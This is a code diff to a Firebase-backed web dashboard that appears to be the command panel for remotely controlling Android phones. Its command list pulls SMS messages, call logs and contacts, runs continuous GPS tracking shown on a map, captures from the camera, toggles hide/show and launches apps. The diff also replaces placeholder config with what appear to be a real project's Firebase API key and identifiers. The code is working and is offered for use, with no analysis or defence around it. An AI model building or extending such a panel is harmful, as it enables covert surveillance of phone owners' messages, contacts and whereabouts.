@@ -464,7 +464,7 @@ a { color: var(--accent); }
         📋<span id="resultBadge" class="badge" style="display:none;">0</span>
       </button>
       <button class="sidebar-btn" data-view="mapView" onclick="showView('mapView')" title="Map">🗺️</button>
-      <button class="sidebar-btn" data-view="historyView" onclick="loadFullHistory()" title="History">📜</button>
+      <button class="sidebar-btn" data-view="historyView" onclick="showView('historyView'); loadFullHistory()" title="History">📜</button>
     </div>
 
     <!-- ═══ DEVICE PANEL ═══ -->
@@ -474,7 +474,7 @@ a { color: var(--accent); }
         <button class="btn btn-sm btn-ghost" onclick="startDeviceDiscovery()">🔄 Refresh</button>
       </div>
       <div id="deviceList" class="device-list">
-        <div class="empty">Select a device to control</div>
+        <div class="empty">Logging in…</div>
       </div>
     </div>
 
@@ -543,7 +543,7 @@ a { color: var(--accent); }
             </tr>
           </thead>
           <tbody id="historyBody">
-            <tr><td colspan="5" style="text-align:center;padding:40px;color:var(--text-dim);">Click 📜 to load history</td></tr>
+            <tr><td colspan="5" style="text-align:center;padding:40px;color:var(--text-dim);">Select device and click 📜 to load history</td></tr>
           </tbody>
         </table>
       </div>
@@ -563,7 +563,7 @@ a { color: var(--accent); }
 
     <!-- Toggle selector -->
     <div id="modalToggleSelector" style="display:none;margin-top:8px;">
-      <label style="font-size:11px;font-weight:600;color:var(--text-dim);">Toggle:</label>
+      <label style="font-size:11px;font-weight:600;color:var(--text-dim);">Value:</label>
       <select id="modalToggleValue">
         <option value="on">ON</option>
         <option value="off">OFF</option>
@@ -668,16 +668,17 @@ a { color: var(--accent); }
      ═══════════════════════════════════════════════════════ -->
 <script>
 // ═════════════════════════════════════════════════════════
-//  🔑 FIREBASE CONFIG — Set once at deploy time.
+//  🔐 FIREBASE CONFIG — YOUR REAL PROJECT
 //     Users CANNOT edit this from the dashboard.
 // ═════════════════════════════════════════════════════════
 const FIREBASE_CONFIG = {
-    apiKey: "YOUR_API_KEY",
-    authDomain: "YOUR_PROJECT.firebaseapp.com",
-    projectId: "YOUR_PROJECT_ID",
-    storageBucket: "YOUR_PROJECT.appspot.com",
-    messagingSenderId: "YOUR_SENDER_ID",
-    appId: "YOUR_APP_ID"
+    apiKey: "AIzaSyCbb-g6DhyCUjAcmglnkj-B3NLoI2KnL8o",
+    authDomain: "control-f5136.firebaseapp.com",
+    projectId: "control-f5136",
+    storageBucket: "control-f5136.firebasestorage.app",
+    messagingSenderId: "204625008820",
+    appId: "1:204625008820:web:2802cd55ea8f327e6a9fe1",
+    measurementId: "G-0CJFQ2DJLV"
 };
 
 // ═════════════════════════════════════════════════════════
@@ -686,7 +687,7 @@ const FIREBASE_CONFIG = {
 const state = {
     selectedDeviceId: null,
     devices: [],
-    userDeviceIds: [],     // device IDs assigned to this user
+    userDeviceIds: [],
     results: [],
     historyData: [],
     historyFiltered: [],
@@ -704,7 +705,7 @@ let firebaseInitialized = false;
 let currentView = 'devicePanel';
 
 // ═════════════════════════════════════════════════════════
-//  COMMAND DEFINITIONS (same as before — unchanged)
+//  COMMAND DEFINITIONS
 // ═════════════════════════════════════════════════════════
 const CAT_NAMES = {
     sms: '📨 SMS',      calls: '📞 Calls',     contacts: '👤 Contacts',
@@ -741,7 +742,7 @@ const COMMANDS = {
     ],
     location: [
         { icon:'📍', name:'Get Location', action:'get_location' },
-        { icon:'🛰️', name:'GPS Tracking', action:'start_tracking', isTrackingToggle:true, hasSeekbar:true, params:{interval_ms:5000} },
+        { icon:'🛰️', name:'GPS Tracking', action:'start_tracking', isTrackingToggle:true, params:{interval_ms:5000} },
     ],
     device: [
         { icon:'ℹ️', name:'Device Info', action:'get_device_info' },
@@ -775,7 +776,7 @@ const COMMANDS = {
 };
 
 // ═════════════════════════════════════════════════════════
-//  🔐  AUTH — Login / Logout / Auth State
+//  🔐  AUTH
 // ═════════════════════════════════════════════════════════
 let auth = null;
 
@@ -785,33 +786,28 @@ function initFirebase() {
         firebase.initializeApp(FIREBASE_CONFIG);
         db = firebase.firestore();
         auth = firebase.auth();
-        // Enable offline persistence
         db.enablePersistence().catch(() => {});
         firebaseInitialized = true;
-        console.log('✅ Firebase initialized');
-        // Set up auth listener
+        console.log('✅ Firebase initialized with project:', FIREBASE_CONFIG.projectId);
         auth.onAuthStateChanged(handleAuthState);
     } catch (e) {
         console.error('❌ Firebase init error:', e);
-        showLoginError('Failed to initialize. Check console.');
+        showLoginError('Firebase initialization failed. Check console.');
     }
 }
 
 function handleAuthState(user) {
     if (user) {
-        // Logged in
         state.authUser = user;
         document.getElementById('loginScreen').style.display = 'none';
         document.getElementById('dashboardScreen').style.display = 'flex';
         document.getElementById('userEmailDisplay').textContent = user.email;
         document.getElementById('userEmailDisplay').title = 'Logged in as ' + user.email;
 
-        // Load this user's assigned devices
         loadUserDeviceIds(user.uid).then(() => {
             startDashboard();
         });
     } else {
-        // Not logged in
         state.authUser = null;
         state.userDeviceIds = [];
         state.devices = [];
@@ -833,7 +829,7 @@ async function loadUserDeviceIds(uid) {
             console.log(`✅ User has ${state.userDeviceIds.length} assigned device(s)`);
         } else {
             state.userDeviceIds = [];
-            console.log('ℹ️ No user_devices document found — no devices assigned');
+            console.log('ℹ️ No user_devices doc found — no devices assigned');
         }
     } catch (e) {
         console.error('❌ Error loading user devices:', e);
@@ -858,7 +854,6 @@ function handleLogin() {
     auth.signInWithEmailAndPassword(email, password)
         .then((cred) => {
             console.log('✅ Login success:', cred.user.email);
-            // Auth state handler will take over from here
         })
         .catch((err) => {
             btn.disabled = false;
@@ -878,11 +873,8 @@ function handleLogin() {
 
 function handleLogout() {
     if (!auth) return;
-    // Clean up listeners / stop tracking
     if (state.trackingActive) stopTrackingOnDevice();
-    // Destroy map
     if (state.map) { state.map.remove(); state.map = null; state.mapMarkers = {}; }
-
     auth.signOut().then(() => {
         console.log('✅ Logged out');
         toast('Logged out', 'info');
@@ -900,7 +892,6 @@ function hideLoginError() {
     document.getElementById('loginError').style.display = 'none';
 }
 
-// Allow Enter key to submit login
 document.addEventListener('DOMContentLoaded', () => {
     document.getElementById('loginPassword').addEventListener('keydown', (e) => {
         if (e.key === 'Enter') handleLogin();
@@ -915,22 +906,18 @@ document.addEventListener('DOMContentLoaded', () => {
 // ═════════════════════════════════════════════════════════
 function startDashboard() {
     if (!firebaseInitialized || !state.authUser) return;
-
-    // Init map container
     initMap();
-
-    // Start discovering devices (filtered by user's assigned IDs)
     startDeviceDiscovery();
-
-    // Start real-time listener for devices
-    startDeviceListener();
-
-    // Render command categories
+    setInterval(() => {
+        if (state.authUser && state.userDeviceIds.length > 0) {
+            startDeviceDiscovery();
+        }
+    }, 30000);
     renderCmdCategories('sms');
 }
 
 // ═════════════════════════════════════════════════════════
-//  📱  DEVICE DISCOVERY — Filtered by user's assigned devices
+//  📱  DEVICE DISCOVERY
 // ═════════════════════════════════════════════════════════
 function startDeviceDiscovery() {
     const list = document.getElementById('deviceList');
@@ -953,7 +940,6 @@ function startDeviceDiscovery() {
 
     list.innerHTML = '<div class="empty"><span class="loading-spinner"></span> Loading devices…</div>';
 
-    // Query only the devices assigned to this user
     db.collection('devices')
       .where('__name__', 'in', state.userDeviceIds)
       .get()
@@ -967,14 +953,12 @@ function startDeviceDiscovery() {
           updateDeviceSelection();
       })
       .catch((e) => {
-          console.error('❌ Device discovery error:', e);
-          // Fallback: try individual fetches
+          console.error('❌ Device query error:', e);
           fetchDevicesIndividually();
       });
 }
 
 async function fetchDevicesIndividually() {
-    const list = document.getElementById('deviceList');
     const devices = [];
     for (const deviceId of state.userDeviceIds) {
         try {
@@ -989,17 +973,6 @@ async function fetchDevicesIndividually() {
     state.devices = devices;
     renderDeviceList();
     updateDeviceSelection();
-}
-
-function startDeviceListener() {
-    // Real-time listener only works if we can query by device IDs
-    // Since 'in' queries don't work with onSnapshot easily, we'll
-    // poll periodically as fallback
-    setInterval(() => {
-        if (state.authUser && state.userDeviceIds.length > 0) {
-            startDeviceDiscovery();
-        }
-    }, 30000); // refresh every 30s
 }
 
 function renderDeviceList() {
@@ -1044,7 +1017,6 @@ function selectDevice(deviceId) {
     document.getElementById('controlledDeviceDisplay').title = deviceId;
     toast('Controlling: ' + deviceId.slice(0, 12) + '…', 'info');
 
-    // Check for pending results
     setTimeout(() => {
         loadPendingResultsForDevice(deviceId);
         startResultListenerForDevice(deviceId);
@@ -1052,12 +1024,10 @@ function selectDevice(deviceId) {
 }
 
 function updateDeviceSelection() {
-    // If current selected device is no longer in list, clear selection
     if (state.selectedDeviceId && !state.devices.find(d => d.id === state.selectedDeviceId)) {
         state.selectedDeviceId = null;
         document.getElementById('controlledDeviceDisplay').textContent = '—';
     }
-    // Auto-select first device if none selected and devices exist
     if (!state.selectedDeviceId && state.devices.length > 0) {
         selectDevice(state.devices[0].id);
     }
@@ -1104,7 +1074,6 @@ function initMap() {
 function updateMapMarker(deviceId, lat, lng, label) {
     if (!state.map) initMap();
     if (!state.map) return;
-
     if (state.mapMarkers[deviceId]) {
         state.mapMarkers[deviceId].setLatLng([lat, lng]);
     } else {
@@ -1150,7 +1119,6 @@ function executeCmd(cmd, params) {
         document.getElementById('cmdLastStatus').textContent = 'Sent';
         document.getElementById('cmdLastStatus').className = 'value yellow';
 
-        // Listen for result
         const unsub = db.collection('results').doc(cmdId).onSnapshot(snap => {
             if (snap.exists) {
                 const d = snap.data();
@@ -1162,7 +1130,6 @@ function executeCmd(cmd, params) {
             }
         });
 
-        // Timeout after 30s
         setTimeout(() => {
             const found = state.results.find(r => r.id === cmdId);
             if (found && (found.status === 'sent' || found.status === 'pending')) {
@@ -1179,7 +1146,7 @@ function executeCmd(cmd, params) {
 }
 
 // ═════════════════════════════════════════════════════════
-//  FORMAT RESULTS — Structured for ALL data types
+//  FORMAT RESULTS
 // ═════════════════════════════════════════════════════════
 function formatResultOutput(action, output) {
     if (!output || output === '—') return escapeHtml(output);
@@ -1193,7 +1160,6 @@ function formatResultOutput(action, output) {
     ];
     if (!structActions.includes(action)) return rawHtml;
 
-    // Try JSON first
     let parsed = null;
     try {
         parsed = typeof output === 'string' ? JSON.parse(output) :
@@ -1203,25 +1169,25 @@ function formatResultOutput(action, output) {
     if (parsed) {
         if (Array.isArray(parsed)) {
             if (parsed.length === 0) return '<span style="color:var(--text-dim);">(empty list)</span>';
-            let html = `<div class="ri-structured"><span style="font-size:10px;color:var(--text-dim);display:block;margin-bottom:4px;">📋 ${parsed.length} items</span>`;
+            let html = '<div class="ri-structured"><span style="font-size:10px;color:var(--text-dim);display:block;margin-bottom:4px;">📋 ' + parsed.length + ' items</span>';
             parsed.forEach((item, idx) => {
                 if (typeof item === 'object') {
                     const keys = Object.keys(item);
-                    html += `<div class="struct-row" style="cursor:pointer;" onclick='showResultDetail(${escapeHtml(JSON.stringify(item))})'>`;
-                    html += `<span class="struct-key" style="min-width:30px;">#${idx+1}</span>`;
+                    html += '<div class="struct-row" style="cursor:pointer;" onclick=\'showResultDetail(' + escapeHtml(JSON.stringify(item)) + ')\'>';
+                    html += '<span class="struct-key" style="min-width:30px;">#' + (idx+1) + '</span>';
                     const previewKeys = keys.slice(0, 3);
                     previewKeys.forEach((k, ki) => {
                         const v = String(item[k] || '').slice(0, 60);
                         if (k.toLowerCase().includes('body') || k.toLowerCase().includes('text')) {
-                            html += `<span class="struct-val sms-text">${escapeHtml(v)}</span>`;
+                            html += '<span class="struct-val sms-text">' + escapeHtml(v) + '</span>';
                         } else {
-                            html += `<span class="struct-val">${escapeHtml(v)}${ki < previewKeys.length-1 ? ' · ' : ''}</span>`;
+                            html += '<span class="struct-val">' + escapeHtml(v) + (ki < previewKeys.length-1 ? ' · ' : '') + '</span>';
                         }
                     });
-                    if (keys.length > 3) html += `<span class="struct-val" style="color:var(--accent);">+${keys.length-3} fields</span>`;
-                    html += `</div>`;
+                    if (keys.length > 3) html += '<span class="struct-val" style="color:var(--accent);">+' + (keys.length-3) + ' fields</span>';
+                    html += '</div>';
                 } else {
-                    html += `<div class="struct-row"><span class="struct-key">#${idx+1}</span><span class="struct-val">${escapeHtml(String(item))}</span></div>`;
+                    html += '<div class="struct-row"><span class="struct-key">#' + (idx+1) + '</span><span class="struct-val">' + escapeHtml(String(item)) + '</span></div>';
                 }
             });
             html += '</div><div class="struct-toggle" onclick="showRawResult(this)">Show raw output</div>';
@@ -1231,14 +1197,13 @@ function formatResultOutput(action, output) {
             let html = '<div class="ri-structured">';
             Object.entries(parsed).forEach(([k, v]) => {
                 const valStr = typeof v === 'object' ? JSON.stringify(v).slice(0, 100) : String(v).slice(0, 100);
-                html += `<div class="struct-row"><span class="struct-key">${escapeHtml(k)}</span><span class="struct-val">${escapeHtml(valStr)}</span></div>`;
+                html += '<div class="struct-row"><span class="struct-key">' + escapeHtml(k) + '</span><span class="struct-val">' + escapeHtml(valStr) + '</span></div>';
             });
             html += '</div><div class="struct-toggle" onclick="showRawResult(this)">Show raw output</div>';
             return html;
         }
     }
 
-    // Non-JSON fallback — line-based structured view
     if (typeof output === 'string') {
         const lines = output.split('\n').filter(l => l.trim());
         const dataLines = lines.filter(l => /^\[\d+\]/.test(l.trim()));
@@ -1247,9 +1212,9 @@ function formatResultOutput(action, output) {
         if (dataLines.length >= 1) {
             let html = '<div class="ri-structured">';
             if (headerLines.length > 0) {
-                html += `<span style="font-size:10px;color:var(--text-dim);display:block;margin-bottom:4px;">📋 ${escapeHtml(headerLines.join(' · '))}</span>`;
+                html += '<span style="font-size:10px;color:var(--text-dim);display:block;margin-bottom:4px;">📋 ' + escapeHtml(headerLines.join(' · ')) + '</span>';
             } else {
-                html += `<span style="font-size:10px;color:var(--text-dim);display:block;margin-bottom:4px;">📋 ${dataLines.length} items</span>`;
+                html += '<span style="font-size:10px;color:var(--text-dim);display:block;margin-bottom:4px;">📋 ' + dataLines.length + ' items</span>';
             }
             dataLines.forEach((line) => {
                 const match = line.trim().match(/^\[(\d+)\]\s*(.*)/);
@@ -1257,36 +1222,35 @@ function formatResultOutput(action, output) {
                     const idx = match[1];
                     let content = match[2];
                     const columns = content.split('|').map(c => c.trim()).filter(c => c);
-                    html += `<div class="struct-row" style="cursor:pointer;" onclick='showResultDetail(${escapeHtml(JSON.stringify(line.trim()))})'>`;
-                    html += `<span class="struct-key" style="min-width:30px;">#${idx}</span>`;
+                    html += '<div class="struct-row" style="cursor:pointer;" onclick=\'showResultDetail(' + escapeHtml(JSON.stringify(line.trim())) + ')\'>';
+                    html += '<span class="struct-key" style="min-width:30px;">#' + idx + '</span>';
                     const showCols = columns.slice(0, 4);
                     showCols.forEach((col, ci) => {
                         const isLast = ci === showCols.length - 1;
                         const isLong = col.length > 30;
                         if (isLast && isLong && columns.length >= 3) {
-                            html += `<span class="struct-val sms-text">${escapeHtml(col)}</span>`;
+                            html += '<span class="struct-val sms-text">' + escapeHtml(col) + '</span>';
                         } else {
-                            html += `<span class="struct-val">${escapeHtml(col)}</span>`;
+                            html += '<span class="struct-val">' + escapeHtml(col) + '</span>';
                         }
                         if (ci < showCols.length - 1) {
-                            html += `<span class="struct-val" style="color:var(--text-dim);flex:0;">·</span>`;
+                            html += '<span class="struct-val" style="color:var(--text-dim);flex:0;">·</span>';
                         }
                     });
                     if (columns.length > 4) {
-                        html += `<span class="struct-val" style="color:var(--accent);flex:0;">+${columns.length-4}</span>`;
+                        html += '<span class="struct-val" style="color:var(--accent);flex:0;">+' + (columns.length-4) + '</span>';
                     }
-                    html += `</div>`;
+                    html += '</div>';
                 }
             });
             html += '</div><div class="struct-toggle" onclick="showRawResult(this)">Show raw output</div>';
             return html;
         }
 
-        // Multi-line fallback
         if (lines.length >= 3) {
             let html = '<div class="ri-structured" style="max-height:250px;">';
             lines.forEach((line, i) => {
-                html += `<div class="struct-row"><span class="struct-key">#${i+1}</span><span class="struct-val">${escapeHtml(line)}</span></div>`;
+                html += '<div class="struct-row"><span class="struct-key">#' + (i+1) + '</span><span class="struct-val">' + escapeHtml(line) + '</span></div>';
             });
             html += '</div><div class="struct-toggle" onclick="showRawResult(this)">Show raw output</div>';
             return html;
@@ -1316,7 +1280,7 @@ function showResultDetail(jsonStr) {
     try {
         const data = JSON.parse(jsonStr);
         document.getElementById('rdTitle').textContent = '📄 Item Detail';
-        document.getElementById('rdMeta').textContent = `Type: ${typeof data === 'object' ? 'Object' : typeof data}`;
+        document.getElementById('rdMeta').textContent = 'Type: ' + (typeof data === 'object' ? 'Object' : typeof data);
         document.getElementById('rdBody').textContent = JSON.stringify(data, null, 2);
     } catch(e) {
         document.getElementById('rdTitle').textContent = '📄 Item Detail';
@@ -1366,8 +1330,8 @@ function renderCmdResults() {
             (canRetry ? '<button class="retry-btn" onclick="retryCmd(\'' + r.id + '\')">↻ Retry</button>' : '') +
             '</div>' +
             (hasStructured
-                ? `<div class="ri-output" style="display:none;">${rawOutput}</div>${formattedOutput}`
-                : `<div class="ri-output">${rawOutput}</div>`
+                ? '<div class="ri-output" style="display:none;">' + rawOutput + '</div>' + formattedOutput
+                : '<div class="ri-output">' + rawOutput + '</div>'
             ) +
             '</div>';
     }).join('');
@@ -1400,7 +1364,7 @@ function retryLastFailedCmd() {
 }
 
 // ═════════════════════════════════════════════════════════
-//  LOCATION RESULT HANDLER
+//  LOCATION RESULT
 // ═════════════════════════════════════════════════════════
 function handleLocationResult(data, cmdId) {
     try {
@@ -1414,14 +1378,12 @@ function handleLocationResult(data, cmdId) {
             );
         }
     } catch(e) {
-        // Try regex parsing
         const latMatch = output.match(/lat[^\d.-]*(-?[\d.]+)/i);
         const lngMatch = output.match(/lng[^\d.-]*(-?[\d.]+)/i) || output.match(/lon[^\d.-]*(-?[\d.]+)/i);
         if (latMatch && lngMatch) {
             updateMapMarker(
                 data.deviceId || state.selectedDeviceId || 'device',
-                parseFloat(latMatch[1]), parseFloat(lngMatch[1]),
-                'Device'
+                parseFloat(latMatch[1]), parseFloat(lngMatch[1]), 'Device'
             );
         }
     }
@@ -1441,7 +1403,6 @@ function startTrackingOnDevice(intervalMs) {
         action: 'start_tracking'
     }, { interval_ms: parseInt(intervalMs) || 5000 });
 
-    // Set up periodic location polling
     if (state._trackingInterval) clearInterval(state._trackingInterval);
     state._trackingInterval = setInterval(() => {
         if (!state.trackingActive || !state.selectedDeviceId) {
@@ -1457,11 +1418,7 @@ function stopTrackingOnDevice() {
     if (state._trackingInterval) { clearInterval(state._trackingInterval); state._trackingInterval = null; }
     document.getElementById('mapTrackingStatus').textContent = '📍 Tracking: off';
     toast('⏹️ Tracking stopped', 'info');
-
-    executeCmd({
-        name: 'Stop GPS Tracking',
-        action: 'stop_tracking'
-    }, {});
+    executeCmd({ name: 'Stop GPS Tracking', action: 'stop_tracking' }, {});
 }
 
 // ═════════════════════════════════════════════════════════
@@ -1481,7 +1438,6 @@ async function loadPendingResultsForDevice(deviceId) {
 
         if (cmdIds.length === 0) return;
 
-        // Check for results
         const resultSnap = await db.collection('results').get();
         const resultMap = {};
         resultSnap.forEach(doc => { resultMap[doc.id] = doc.data(); });
@@ -1507,8 +1463,6 @@ async function loadPendingResultsForDevice(deviceId) {
 }
 
 function startResultListenerForDevice(deviceId) {
-    // Real-time listener is set up per-command in executeCmd
-    // This is a backup poller
     if (state._resultPoller) clearInterval(state._resultPoller);
     state._resultPoller = setInterval(() => {
         if (state.selectedDeviceId === deviceId && state.authUser) {
@@ -1527,7 +1481,6 @@ function showParamModal(cmd) {
     const fields = document.getElementById('modalFields');
     fields.innerHTML = '';
 
-    // Reset visibility
     document.getElementById('modalToggleSelector').style.display = 'none';
     document.getElementById('modalCameraSelector').style.display = 'none';
     document.getElementById('modalHideShowSelector').style.display = 'none';
@@ -1615,7 +1568,6 @@ function showParamModal(cmd) {
         return;
     }
 
-    // Regular params
     if (cmd.params) {
         Object.entries(cmd.params).forEach(([key, val]) => {
             if (key === 'limit' && cmd.hasLimit) return;
@@ -1648,12 +1600,10 @@ function confirmParamCmd() {
     if (!cmd) return;
     const params = {};
 
-    // Collect from fields
     document.querySelectorAll('#modalFields input[data-param-key]').forEach(inp => {
         params[inp.dataset.paramKey] = inp.value;
     });
 
-    // Toggle
     if (cmd.isToggle) params.value = document.getElementById('modalToggleValue').value;
     if (cmd.isCamera) params.camera = document.getElementById('modalCameraValue').value;
     if (cmd.isHideShow) params.action = document.getElementById('modalHideShowValue').value;
@@ -1667,7 +1617,6 @@ function confirmParamCmd() {
         if (!params.package) { toast('Enter or select a package', 'error'); return; }
     }
 
-    // Merge with defaults
     const merged = { ...(cmd.params || {}), ...params };
     closeParamModal();
     executeCmd(cmd, merged);
@@ -1751,7 +1700,6 @@ function fetchInstalledAppsForModal() {
                             });
                         }
                     } catch(e) {
-                        // Parse line-based output
                         const lines = d.output.split('\n');
                         lines.forEach(line => {
                             const parts = line.split('|');
@@ -1764,11 +1712,11 @@ function fetchInstalledAppsForModal() {
                     const select = document.getElementById('openAppSelect');
                     select.innerHTML = '<option value="">— Select installed app —</option>' +
                         apps.sort((a,b) => a.label.localeCompare(b.label))
-                            .map(a => `<option value="${escapeHtml(a.pkg)}">${escapeHtml(a.label)}</option>`)
+                            .map(a => '<option value="' + escapeHtml(a.pkg) + '">' + escapeHtml(a.label) + '</option>')
                             .join('');
 
                     document.getElementById('fetchAppsStatus').textContent =
-                        `✅ ${apps.length} apps loaded. Select or type package name.`;
+                        '✅ ' + apps.length + ' apps loaded. Select or type package name.';
                     btn.disabled = false;
                     btn.textContent = '📦 Fetch Apps';
                 }
@@ -1837,16 +1785,16 @@ async function loadFullHistory() {
         const actionFilter = document.getElementById('histActionFilter');
         const actions = [...new Set(historyItems.map(h => h.action))].sort();
         actionFilter.innerHTML = '<option value="all">All Actions</option>' +
-            actions.map(a => `<option value="${a}">${a}</option>`).join('');
+            actions.map(a => '<option value="' + a + '">' + a + '</option>').join('');
 
         state.historySortKey = 'time';
         state.historySortAsc = false;
         sortHistory('time');
-        toast(`📋 Loaded ${historyItems.length} history entries`, 'info');
+        toast('📋 Loaded ' + historyItems.length + ' history entries', 'info');
     } catch (e) {
         console.error('❌ History error:', e);
         document.getElementById('historyBody').innerHTML =
-            `<tr><td colspan="5" style="text-align:center;padding:40px;color:var(--red);">Error: ${escapeHtml(e.message)}</td></tr>`;
+            '<tr><td colspan="5" style="text-align:center;padding:40px;color:var(--red);">Error: ' + escapeHtml(e.message) + '</td></tr>';
     }
 }
 
@@ -1891,7 +1839,7 @@ function filterHistory() {
 function renderHistoryTable() {
     const tbody = document.getElementById('historyBody');
     const count = state.historyFiltered.length;
-    document.getElementById('histCountDisplay').textContent = `${count} / ${state.historyData.length} entries`;
+    document.getElementById('histCountDisplay').textContent = count + ' / ' + state.historyData.length + ' entries';
     if (count === 0) {
         tbody.innerHTML = '<tr><td colspan="5" style="text-align:center;padding:40px;color:var(--text-dim);">No matching entries</td></tr>';
         return;
@@ -1904,15 +1852,14 @@ function renderHistoryTable() {
         const outputTruncated = h.output.length > 80
             ? escapeHtml(h.output.slice(0, 80)) + '…' : escapeHtml(h.output);
         const isLong = h.output.length > 80;
-        return `<tr class="${rowClass}">
-            <td class="ht-time">${h.timeStr}</td>
-            <td class="ht-action">${escapeHtml(h.action)}</td>
-            <td><span class="ht-status ${h.status}">${h.status}</span></td>
-            <td style="font-size:11px;color:var(--text-dim);max-width:150px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;" title="${escapeHtml(paramsStr)}">${paramsStr}</td>
-            <td><span class="ht-output" id="ht_out_${escapeHtml(h.id)}">${outputTruncated}</span>
-                ${isLong ? `<span class="ht-expand-btn" onclick="toggleHistOutput('${escapeHtml(h.id)}')">expand</span>` : ''}
-            </td>
-        </tr>`;
+        return '<tr class="' + rowClass + '">' +
+            '<td class="ht-time">' + h.timeStr + '</td>' +
+            '<td class="ht-action">' + escapeHtml(h.action) + '</td>' +
+            '<td><span class="ht-status ' + h.status + '">' + h.status + '</span></td>' +
+            '<td style="font-size:11px;color:var(--text-dim);max-width:150px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;" title="' + escapeHtml(paramsStr) + '">' + paramsStr + '</td>' +
+            '<td><span class="ht-output" id="ht_out_' + escapeHtml(h.id) + '">' + outputTruncated + '</span>' +
+            (isLong ? '<span class="ht-expand-btn" onclick="toggleHistOutput(\'' + escapeHtml(h.id) + '\')">expand</span>' : '') +
+            '</td></tr>';
     }).join('');
 }
 
@@ -1949,7 +1896,7 @@ function escapeHtml(s) {
 }
 
 // ═════════════════════════════════════════════════════════
-//  INIT — Start everything
+//  INIT
 // ═════════════════════════════════════════════════════════
 initFirebase();
 </script>
